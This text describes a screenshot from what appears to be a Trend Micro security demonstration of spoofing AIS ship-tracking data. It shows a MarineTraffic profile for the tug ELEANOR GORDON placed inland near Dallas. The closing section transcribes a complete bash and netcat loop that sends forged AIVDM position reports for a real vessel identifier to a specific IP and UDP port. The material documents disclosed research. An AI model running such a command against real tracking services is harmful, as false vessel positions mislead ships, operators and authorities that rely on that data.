# Trend Micro AIS Spoofing Demonstration (`trend-micros-non-ais-hack.png`)

## Overview
This image is a screenshot from a Trend Micro demonstration video illustrating how unauthenticated Automatic Identification System (AIS) vessel position messages can be spoofed and injected into public ship-tracking websites such as MarineTraffic.com via open UDP ports.

## Scene & Interface Layout
The frame is split into three main visual components against a black letterboxed video frame:
- **Right Side (Video Footage)**: A researcher with short brown hair, a beard, and glasses wearing a dark gray t-shirt with a red graphic is seated in a black office chair at a wooden desk, typing on a silver laptop. Behind him, large office windows look out onto modern multi-story white office buildings under a bright sky. In the top-right corner is the **TREND MICRO** logo (a red sphere with a white 't' swoosh above black text).
- **Left Side (MarineTraffic Vessel Details Overlay)**: A white webpage panel showing the vessel profile for **ELEANOR GORDON**.
- **Bottom Center (Terminal Command Overlay)**: A cropped white terminal window showing a bash loop generating and transmitting crafted AIVDM sentences over Netcat (`nc`).

## Visible Text & Labels

### Vessel Profile (`ELEANOR GORDON`)
- **Links**: `Contribute to this page` | `Add to My Fleet`
- **Vessel's Details**:
  - **Ship Type**: `Tug`
  - **Length x Breadth**: `60 m X 16 m`
  - **Speed recorded (Max / Average)**: `9.3 / 6.7 knots`
  - **Flag**: `USA [US]` (accompanied by a small US flag icon)
  - **Call Sign**: `WDG4089`
  - **IMO**: `0`, **MMSI**: `367532850` (highlighted in light blue)
- **Last Position Received**:
  - **Area**: `Pacific North`
  - **Latitude / Longitude**: `32.8651° / -96.9197° (Map)` (inland coordinates near Dallas, Texas)
  - **Speed/Course**: `5.2 knots / 353°`
- **Bottom Link**: `Itineraries History`

### Terminal Command Line
```bash
embyte@wine:~/projects/AIS/code$ for i in `seq 100000`; do sleep 1; echo -n -e `./AIVDM_Encoder.py --type=1 --mmsi=367532850 --speed=5.2 --long=-96.9197 --lat=32.8651 --course=353.1 | xargs -I MARCO ./unpacker MARCO 1 A` | nc -q0 -u 5.9.207.224 5322; done
```
